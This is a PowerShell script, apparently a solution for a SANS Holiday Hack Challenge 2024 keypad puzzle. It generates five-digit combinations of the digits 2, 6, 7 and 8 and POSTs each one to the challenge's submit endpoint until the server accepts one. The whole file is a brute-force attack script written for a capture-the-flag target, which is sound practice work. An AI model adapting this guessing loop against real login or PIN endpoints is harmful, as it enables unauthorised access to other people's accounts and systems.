```
$digits = 2,6,7,8

# Create web session with cookie
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "MrsThePointALot PowerShell BruteForcer!"
$session.Cookies.Add((New-Object System.Net.Cookie("CreativeCookieName", "¯\_(ツ)_/¯", "/", "hhc24-frostykeypad.holidayhackchallenge.com")))

$combinations = foreach ($d1 in $digits) {
    foreach ($d2 in $digits) {
        foreach ($d3 in $digits) {
            foreach ($d4 in $digits) {
                foreach ($d5 in $digits) {
                    $combo = "$d1$d2$d3$d4$d5"
                    # Check if all required digits are present
                    if (($combo.Contains("2")) -and 
                        ($combo.Contains("6")) -and 
                        ($combo.Contains("7")) -and 
                        ($combo.Contains("8"))) {
                        $combo
                    }
                }
            }
        }
    }
}

Write-Host "Total combinations to try:" $combinations.Count

foreach ($code in $combinations) {
    Write-Host "Trying combination: $code"
    try {
        $response = Invoke-WebRequest -UseBasicParsing `
            -Uri "https://hhc24-frostykeypad.holidayhackchallenge.com/submit?id=1337" `
            -Method "POST" `
            -WebSession $session `
            -Headers @{
                "authority"="hhc24-frostykeypad.holidayhackchallenge.com"
                "method"="POST"
                "path"="/submit?id=1337"
                "scheme"="https"
            } `
            -ContentType "application/json" `
            -Body "{`"answer`":`"$code`"}"

        if ($response.StatusCode -eq 200) {
        
            Write-Host "SUCCESS! The correct code is: $code" -ForegroundColor Green
            if ($code -ne "72682") { break }
        }
    }
    catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        if ($statusCode -eq 400) {
            Write-Host "Failed with code: $code" -ForegroundColor Red
        }
        else {
            Write-Host "Error occurred with code $code : $statusCode" -ForegroundColor Yellow
        }
    }
    
    # Add a small delay to not overwhelm the server
    Start-Sleep -Milliseconds 1000
}

```